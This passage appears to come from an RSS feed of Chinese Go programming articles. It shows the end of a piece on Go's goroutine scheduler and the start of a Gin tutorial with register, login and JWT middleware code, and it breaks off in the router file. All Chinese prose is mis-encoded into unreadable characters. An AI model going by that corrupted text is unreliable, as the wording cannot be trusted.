<span class="hljs-bullet">  4.</span> çªƒå–å…¶ä»– P çš„é˜Ÿåˆ— (stealWork -&gt; runqsteal)
<span class="hljs-bullet">  5.</span> å†æ¬¡æ£€æŸ¥å…¨å±€é˜Ÿåˆ—å’Œ netpoller
<span class="hljs-bullet">  6.</span> å¦‚æœè¿˜æ˜¯æ²¡æœ‰ï¼Œpark Mï¼ˆä¼‘çœ ï¼‰
</code></pre>
<h3 data-id="heading-20">3. execute() - æ‰§è¡Œ G</h3>
<pre><code class="hljs language-scss" lang="scss">èŒè´£ï¼š
  <span class="hljs-number">1</span>. å°† G ç»‘å®šåˆ°å½“å‰ M
  <span class="hljs-number">2</span>. å°† G çš„çŠ¶æ€æ”¹ä¸º _Grunning
  <span class="hljs-number">3</span>. è°ƒç”¨ <span class="hljs-built_in">gogo</span>() (æ±‡ç¼–) åˆ‡æ¢åˆ° G çš„æ ˆå¹¶æ‰§è¡Œ
</code></pre>
<h3 data-id="heading-21">4. sysmon() - ç³»ç»Ÿç›‘æ§çº¿ç¨‹</h3>
<pre><code class="hljs language-markdown" lang="markdown">èŒè´£ï¼š
<span class="hljs-bullet">  1.</span> æ£€æŸ¥é•¿æ—¶é—´è¿è¡Œçš„ Gï¼ˆ&gt;10msï¼‰ï¼Œå‘é€æŠ¢å ä¿¡å·
<span class="hljs-bullet">  2.</span> å›æ”¶é•¿æ—¶é—´é˜»å¡çš„ P
<span class="hljs-bullet">  3.</span> è§¦å‘å¼ºåˆ¶ GC
<span class="hljs-bullet">  4.</span> ç½‘ç»œè½®è¯¢å™¨çš„è¶…æ—¶æ£€æŸ¥
  
æŠ¢å æœºåˆ¶ï¼ˆGo 1.14+ï¼‰ï¼š
<span class="hljs-bullet">  -</span> å‘ç›®æ ‡ M å‘é€ SIGURG ä¿¡å·
<span class="hljs-bullet">  -</span> M æ”¶åˆ°ä¿¡å·åï¼Œåœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­å°†å½“å‰ G æ ‡è®°ä¸ºå¯æŠ¢å 
<span class="hljs-bullet">  -</span> åœ¨ä¸‹ä¸€æ¬¡å®‰å…¨ç‚¹æ£€æŸ¥æŠ¢å æ ‡è®°ï¼Œåˆ‡æ¢åˆ° g0 å¹¶è°ƒç”¨ schedule()
</code></pre>
<hr/>
<h2 data-id="heading-22">äº”ã€å®æˆ˜è¦ç‚¹</h2>
<h3 data-id="heading-23">GODEBUG=schedtrace è¾“å‡ºè§£æ</h3>
<p>è¿è¡Œå‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">GODEBUG=schedtrace=1000 go run main.go
</code></pre>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">SCHED 1000ms: <span class="hljs-attr">gomaxprocs</span>=<span class="hljs-number">8</span> idleprocs=<span class="hljs-number">6</span> threads=<span class="hljs-number">12</span> spinningthreads=<span class="hljs-number">0</span> idlethreads=<span class="hljs-number">5</span> runqueue=<span class="hljs-number">0</span> [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]
</code></pre>
<p>å­—æ®µå«ä¹‰ï¼š</p>
<ul>
<li><code>1000ms</code>: ç¨‹åºè¿è¡Œæ—¶é—´</li>
<li><code>gomaxprocs=8</code>: P çš„æ•°é‡ï¼ˆGOMAXPROCSï¼‰</li>
<li><code>idleprocs=6</code>: ç©ºé—²çš„ P æ•°é‡</li>
<li><code>threads=12</code>: å½“å‰ M çš„æ€»æ•°</li>
<li><code>spinningthreads=0</code>: æ­£åœ¨çªƒå–ä»»åŠ¡çš„ M æ•°é‡</li>
<li><code>idlethreads=5</code>: ç©ºé—²çš„ M æ•°é‡</li>
<li><code>runqueue=0</code>: å…¨å±€é˜Ÿåˆ—ä¸­çš„ G æ•°é‡</li>
<li><code>[0 0 0 0 0 0 0 0]</code>: æ¯ä¸ª P çš„æœ¬åœ°é˜Ÿåˆ—ä¸­çš„ G æ•°é‡</li>
</ul>
<h3 data-id="heading-24">å…³é”®è§‚å¯ŸæŒ‡æ ‡</h3>
<ol>
<li><strong>idleprocs è¿‡é«˜</strong>ï¼šè¯´æ˜ CPU åˆ©ç”¨ç‡ä¸è¶³ï¼ŒGoroutine ä¸å¤Ÿæˆ–æœ‰å¤§é‡é˜»å¡</li>
<li><strong>spinningthreads &gt; 0</strong>ï¼šæœ‰ M åœ¨ä¸åœçªƒå–ï¼Œè¯´æ˜å­˜åœ¨è´Ÿè½½ä¸å‡è¡¡</li>
<li><strong>runqueue æŒç»­ç§¯ç´¯</strong>ï¼šå…¨å±€é˜Ÿåˆ—æœ‰å¤§é‡å¾…å¤„ç†çš„ Gï¼Œå¯èƒ½æœ‰æ€§èƒ½ç“¶é¢ˆ</li>
<li><strong>æŸäº› P çš„ runqueue ç‰¹åˆ«å¤§</strong>ï¼šè´Ÿè½½ä¸å‡ï¼Œå¯èƒ½æŸäº› Goroutine åˆ›å»ºäº†è¿‡å¤šå­ä»»åŠ¡</li>
</ol>
<hr/>
<h2 data-id="heading-25">å…­ã€å¸¸è§é¢è¯•é¢˜</h2>
<h3 data-id="heading-26">Q1: ä¸ºä»€ä¹ˆéœ€è¦ Pï¼Ÿç›´æ¥ G-M ä¸è¡Œå—ï¼Ÿ</h3>
<p>A: P çš„å­˜åœ¨æ˜¯ä¸ºäº†å‡å°‘é”ç«äº‰ã€‚æ¯ä¸ª P æœ‰ç‹¬ç«‹çš„æœ¬åœ°é˜Ÿåˆ—ï¼Œé¿å…äº†æ‰€æœ‰ M ç«äº‰å…¨å±€é˜Ÿåˆ—çš„é—®é¢˜ã€‚åŒæ—¶ P å¯ä»¥åœ¨ M é˜»å¡æ—¶ç§»äº¤ç»™å…¶ä»– Mï¼Œä¿è¯å¹¶è¡Œåº¦ã€‚</p>
<h3 data-id="heading-27">Q2: Work Stealing å¦‚ä½•é¿å…ä¸€ç›´çªƒå–ä¸åˆ°ä»»åŠ¡å¯¼è‡´çš„è‡ªæ—‹ï¼Ÿ</h3>
<p>A: findrunnable() ä¼šæœ‰å¤šè½®å°è¯•ï¼Œå¦‚æœå¤šæ¬¡å°è¯•åä»æ‰¾ä¸åˆ°ä»»åŠ¡ï¼ŒM ä¼šè¿›å…¥ park çŠ¶æ€ï¼ˆä¼‘çœ ï¼‰ï¼Œç›´åˆ°æœ‰æ–°ä»»åŠ¡æ—¶è¢«å”¤é†’ã€‚</p>
<h3 data-id="heading-28">Q3: ä»€ä¹ˆæƒ…å†µä¸‹ä¼šåˆ›å»ºæ–°çš„ Mï¼Ÿ</h3>
<p>A:</p>
<ol>
<li>ç°æœ‰ M éƒ½åœ¨æ‰§è¡Œä¸”æœ‰ç©ºé—²çš„ P</li>
<li>M å› ç³»ç»Ÿè°ƒç”¨é˜»å¡ï¼Œéœ€è¦ Hand Off P æ—¶</li>
<li>CGO è°ƒç”¨æ—¶ï¼ˆCGO è°ƒç”¨ä¼šé˜»å¡ Mï¼‰</li>
</ol>
<h3 data-id="heading-29">Q4: Goroutine çš„æ ˆæ˜¯å¦‚ä½•å¢é•¿çš„ï¼Ÿ</h3>
<p>A: Go ä½¿ç”¨åˆ†æ®µæ ˆï¼ˆSegmented Stackï¼ŒGo 1.2-ï¼‰æˆ–è¿ç»­æ ˆï¼ˆContiguous Stackï¼ŒGo 1.3+ï¼‰ã€‚æ ˆç©ºé—´ä¸è¶³æ—¶ä¼šè§¦å‘æ ˆæ‹·è´ï¼Œå°†æ—§æ ˆå†…å®¹æ‹·è´åˆ°æ–°çš„æ›´å¤§çš„æ ˆç©ºé—´ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¯æ—¥ä¸€Go-20ã€Goè¯­è¨€å®æˆ˜-åˆ©ç”¨Ginå¼€å‘ç”¨æˆ·æ³¨å†Œç™»å½•åŠŸèƒ½]]></title>    <link>https://juejin.cn/post/7594103243685904427</link>    <guid>https://juejin.cn/post/7594103243685904427</guid>    <pubDate>2026-01-12T14:48:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594103243685904427" data-draft-id="7594350054090637354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¯æ—¥ä¸€Go-20ã€Goè¯­è¨€å®æˆ˜-åˆ©ç”¨Ginå¼€å‘ç”¨æˆ·æ³¨å†Œç™»å½•åŠŸèƒ½"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2026-01-12T14:48:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Codingå›"/> <meta itemprop="url" content="https://juejin.cn/user/3393534758231305"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¯æ—¥ä¸€Go-20ã€Goè¯­è¨€å®æˆ˜-åˆ©ç”¨Ginå¼€å‘ç”¨æˆ·æ³¨å†Œç™»å½•åŠŸèƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3393534758231305/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Codingå›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T14:48:53.000Z" title="Mon Jan 12 2026 14:48:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡ç»¼åˆå‰é¢æ‰€å­¦çš„çŸ¥è¯†ï¼Œåˆ©ç”¨Ginå¼€å‘ä¸€ä¸ªç”¨æˆ·æ³¨å†Œç™»å½•å’ŒéªŒè¯çš„åŠŸèƒ½ã€‚</p>
<h2 data-id="heading-0">1ã€é¡¹ç›®ç»“æ„</h2>
<pre><code class="hljs language-sh" lang="sh">$ tree
.
|-- config        &lt;- é…ç½®ç›®å½•
|   `-- db.go     &lt;- æ•°æ®åº“é…ç½®
|-- controllers   &lt;- æ§åˆ¶å™¨ç›®å½•
|   `-- auth.go   &lt;- è®¤è¯æ§åˆ¶å™¨
|-- go.mod
|-- go.sum
|-- main.go       &lt;- ç¨‹åºå…¥å£
|-- middlewares   &lt;- ä¸­é—´ä»¶ç›®å½•
|   `-- auth.go   &lt;- è®¤è¯ä¸­é—´ä»¶
|-- models        &lt;- æ¨¡å‹ç›®å½•
|   `-- user.go   &lt;- ç”¨æˆ·æ¨¡å‹
|-- routers       &lt;- è·¯ç”±ç›®å½•
|   |-- auth.go   &lt;- è®¤è¯è·¯ç”±
|   `-- init.go   &lt;- åˆå§‹åŒ–è·¯ç”±æ³¨å†Œ
`-- utils         &lt;- å·¥å…·ç®±
    `-- jwt.go

6 directories, 10 files
</code></pre>
<h2 data-id="heading-1">2ã€å¼€å§‹å†™ä»£ç </h2>
<h3 data-id="heading-2">2.1 config/db.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> config
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"log"</span>
    <span class="hljs-string">"os"</span>
    <span class="hljs-string">"time"</span>
    <span class="hljs-string">"gorm.io/driver/mysql"</span>
    <span class="hljs-string">"gorm.io/gorm"</span>
)
<span class="hljs-keyword">var</span> DB *gorm.DB
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ConnectDatabase</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// dsn := "root:123456@tcp(127.0.0.1:3306)/golang_per_day??charset=utf8&amp;parseTime=True&amp;loc=Local&amp;timeout=1000ms"</span>
    dsn := os.Getenv(<span class="hljs-string">"DATABASE_DSN"</span>)
    <span class="hljs-keyword">if</span> dsn == <span class="hljs-string">""</span> {
        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"è¯·åœ¨ç¯å¢ƒå˜é‡é‡Œé…ç½®ã€DATABASE_DSNã€‘"</span>)
    }
    db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config{})
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        log.Fatal(<span class="hljs-string">"è¿æ¥æ¥æ•°æ®åº“å¤±è´¥ï¼š"</span>, err)
    }
    log.Println(<span class="hljs-string">"æ•°æ®åº“è¿æ¥æˆåŠŸ:"</span>, db)
    sqlDb, err := db.DB()
    <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
        sqlDb.SetMaxIdleConns(<span class="hljs-number">10</span>)
        sqlDb.SetMaxOpenConns(<span class="hljs-number">100</span>)
        sqlDb.SetConnMaxLifetime(time.Hour)
    }
    <span class="hljs-comment">// å¼€å¯debugæ¨¡å¼</span>
    DB = db.Debug()
}
</code></pre>
<h3 data-id="heading-3">2.2 controllers/auth.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> controllers
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"gindemo2/config"</span>
    <span class="hljs-string">"gindemo2/models"</span>
    <span class="hljs-string">"gindemo2/utils"</span>
    <span class="hljs-string">"net/http"</span>
    <span class="hljs-string">"github.com/gin-gonic/gin"</span>
    <span class="hljs-string">"golang.org/x/crypto/bcrypt"</span>
    <span class="hljs-string">"gorm.io/gorm"</span>
)
<span class="hljs-keyword">type</span> inputUser <span class="hljs-keyword">struct</span> {
    Username <span class="hljs-type">string</span> <span class="hljs-string">`json:"username" binding:"required,min=3,max=32"`</span>
    Passwd   <span class="hljs-type">string</span> <span class="hljs-string">`json:"passwd" binding:"required,min=6"`</span>
}
<span class="hljs-comment">// æ³¨å†Œç”¨æˆ·</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(c *gin.Context)</span></span> {
    input := inputUser{}
    <span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;input); err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusBadRequest, gin.H{
            <span class="hljs-string">`error`</span>: err.Error(),
        })
        <span class="hljs-keyword">return</span>
    }
    hasedPwd, err := bcrypt.GenerateFromPassword([]<span class="hljs-type">byte</span>(input.Passwd), bcrypt.DefaultCost)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusInternalServerError, gin.H{
            <span class="hljs-string">`error`</span>: <span class="hljs-string">"å“ˆå¸Œå¯†ç å¤±è´¥"</span>,
        })
        <span class="hljs-keyword">return</span>
    }
    user := models.User{
        Username: input.Username,
        PassWd:   <span class="hljs-type">string</span>(hasedPwd),
    }
    <span class="hljs-keyword">if</span> err := config.DB.Create(&amp;user).Error; err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusInternalServerError, gin.H{<span class="hljs-string">`error`</span>: err.Error()})
        <span class="hljs-keyword">return</span>
    }
    c.JSON(http.StatusOK, gin.H{
        <span class="hljs-string">`message`</span>: <span class="hljs-string">"ç”¨æˆ·åˆ›å»ºæˆåŠŸ"</span>,
        <span class="hljs-string">`user`</span>: gin.H{
            <span class="hljs-string">`id`</span>:       user.ID,
            <span class="hljs-string">`username`</span>: user.Username,
        },
    })
}
<span class="hljs-comment">// ç™»å½•</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Login</span><span class="hljs-params">(c *gin.Context)</span></span> {
    input := inputUser{}
    <span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;input); err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusBadRequest, gin.H{
            <span class="hljs-string">`error`</span>: err.Error(),
        })
        <span class="hljs-keyword">return</span>
    }
    <span class="hljs-keyword">var</span> user models.User
    err := config.DB.Where(<span class="hljs-string">`username = ?`</span>, input.Username).First(&amp;user).Error
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">if</span> err == gorm.ErrRecordNotFound {
            c.JSON(http.StatusUnauthorized, gin.H{<span class="hljs-string">"error"</span>: <span class="hljs-string">"æ— æ•ˆçš„å‡­è¯"</span>})
            <span class="hljs-keyword">return</span>
        }
        c.JSON(http.StatusInternalServerError, gin.H{<span class="hljs-string">"error"</span>: err.Error()})
        <span class="hljs-keyword">return</span>
    }
    err = bcrypt.CompareHashAndPassword([]<span class="hljs-type">byte</span>(user.PassWd), []<span class="hljs-type">byte</span>(input.Passwd))
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusUnauthorized, gin.H{<span class="hljs-string">"error"</span>: <span class="hljs-string">"æ— æ•ˆçš„å‡­è¯"</span>})
        <span class="hljs-keyword">return</span>
    }
    token, err := utils.GenerateToken(user.ID)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusInternalServerError, gin.H{<span class="hljs-string">"error"</span>: <span class="hljs-string">"ç”Ÿæˆtokenå¤±è´¥"</span>})
        <span class="hljs-keyword">return</span>
    }
    c.JSON(http.StatusOK, gin.H{
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"ç™»å½•æˆåŠŸ"</span>,
        <span class="hljs-string">"token"</span>:   token,
        <span class="hljs-string">"user"</span>: gin.H{
            <span class="hljs-string">"id"</span>:       user.ID,
            <span class="hljs-string">"username"</span>: user.Username,
        },
    })
}
<span class="hljs-comment">// æŸ¥è¯¢å½“å‰ç™»å½•è€…çš„ä¿¡æ¯</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Me</span><span class="hljs-params">(c *gin.Context)</span></span> {
    <span class="hljs-keyword">var</span> user models.User
    uid := c.GetUint(<span class="hljs-string">`user_id`</span>)
    fmt.Println(<span class="hljs-string">`uid=`</span>, uid)
    err := config.DB.Where(<span class="hljs-string">`id=?`</span>, uid).First(&amp;user).Error
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusBadRequest, gin.H{
            <span class="hljs-string">`error`</span>: err.Error(),
        })
        <span class="hljs-keyword">return</span>
    }
    c.JSON(http.StatusOK, gin.H{
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"æŸ¥è¯¢æˆåŠŸ"</span>,
        <span class="hljs-string">"user"</span>: gin.H{
            <span class="hljs-string">"id"</span>:       user.ID,
            <span class="hljs-string">"username"</span>: user.Username,
        },
    })
}
</code></pre>
<h3 data-id="heading-4">2.3 middlewares/auth.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> middlewares
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"gindemo2/utils"</span>
    <span class="hljs-string">"net/http"</span>
    <span class="hljs-string">"strings"</span>
    <span class="hljs-string">"github.com/gin-gonic/gin"</span>
)
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AuthMiddleware</span><span class="hljs-params">()</span></span> gin.HandlerFunc {
    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {
        authHeader := c.GetHeader(<span class="hljs-string">"Authorization"</span>)
        <span class="hljs-keyword">if</span> authHeader == <span class="hljs-string">""</span> {
            c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
                <span class="hljs-string">`error`</span>: <span class="hljs-string">"Authorization header ä¸èƒ½ä¸ºç©º"</span>,
            })
            <span class="hljs-keyword">return</span>
        }
        parts := strings.Fields(authHeader)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">2</span> || strings.ToLower(parts[<span class="hljs-number">0</span>]) != <span class="hljs-string">`bearer`</span> {
            c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
                <span class="hljs-string">`error`</span>: <span class="hljs-string">"Authorization header çš„æ ¼å¼é”™è¯¯ï¼Œå¿…é¡»æ˜¯ Bearer {token}"</span>,
            })
            <span class="hljs-keyword">return</span>
        }
        token := parts[<span class="hljs-number">1</span>]
        claims, err := utils.ParseToken(token)
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
                <span class="hljs-string">`error`</span>:  <span class="hljs-string">"éæ³•token"</span>,
                <span class="hljs-string">`detail`</span>: err.Error(),
            })
            <span class="hljs-keyword">return</span>
        }
        fmt.Println(<span class="hljs-string">`claims=`</span>, claims)
        <span class="hljs-comment">//è®¾å®šå½“å‰ç™»å½•çš„ç”¨æˆ·idï¼Œæ–¹ä¾¿ä¼ ä¸‹å»</span>
        c.Set(<span class="hljs-string">`user_id`</span>, claims.UserID)
        c.Next()
    }
}
</code></pre>
<h3 data-id="heading-5">2.4 models/user.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> models
<span class="hljs-keyword">import</span> <span class="hljs-string">"gorm.io/gorm"</span>
<span class="hljs-comment">// ç”¨æˆ·è¡¨</span>
<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> {
    gorm.Model
    <span class="hljs-comment">// gorm:"uniqueIndex" æ˜¯å”¯ä¸€ç´¢å¼•ï¼Œnot nullè¡¨ç¤ºä¸ä¸ºç©º</span>
    Username <span class="hljs-type">string</span> <span class="hljs-string">`json:"username" gorm:"type:varchar(30);uniqueIndex;not null"`</span>
    <span class="hljs-comment">// json:"-", - è¡¨ç¤ºä¸è¾“å‡ºåˆ°json</span>
    PassWd <span class="hljs-type">string</span> <span class="hljs-string">`json:"-" gorm:"not null"`</span>
}
</code></pre>
<h3 data-id="heading-6">2.5 routers/init.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> routers
<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gin-gonic/gin"</span>
<span class="hljs-comment">// å®šä¹‰è·¯ç”±å‡½æ•°</span>
<span class="hljs-keyword">type</span> Router <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*gin.Engine)</span></span>
<span class="hljs-comment">// è¿™é‡Œæ”¾æ‰€æœ‰çš„è·¯ç”±</span>
<span class="hljs-keyword">var</span> routers = []Router{}
<span class="hljs-comment">// åˆå§‹åŒ–è·¯ç”±</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitRouter</span><span class="hljs-params">()</span></span> *gin.Engine {
    r := gin.Default()
    <span class="hljs-keyword">for</span> _, route := <span class="hljs-keyword">range</span> routers {
        route(r)
    }
    <span class="hljs-keyword">return</span> r
}
<span class="hljs-comment">// æ³¨å†Œè·¯ç”±é€šç”¨å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterRoute</span><span class="hljs-params">(r ...Router)</span></span> {
    routers = <span class="hljs-built_in">append</span>(routers, r...)
}
</code></pre>
<h3 data-id="heading-7">2.6 routers/auth.goÂ </h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> routers
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"gindemo2/controllers"</span>
    <span class="hljs-string">"gindemo2/middlewares"</span>
    <span class="hljs-string">"github.com/gin-gonic/gin"</span>
)
<span class="hljs-comment">// init()ä¼šåœ¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œ</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> {
    RegisterRoute(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *gin.Engine)</span></span> {
        <span class="hljs-comment">// è·¯ç”±åˆ†ç»„</span>
        api := e.Group(<span class="hljs-string">"/api/v1"</span>)
        <span class="hljs-comment">// è·¯ç”±åˆ†ç»„</span>
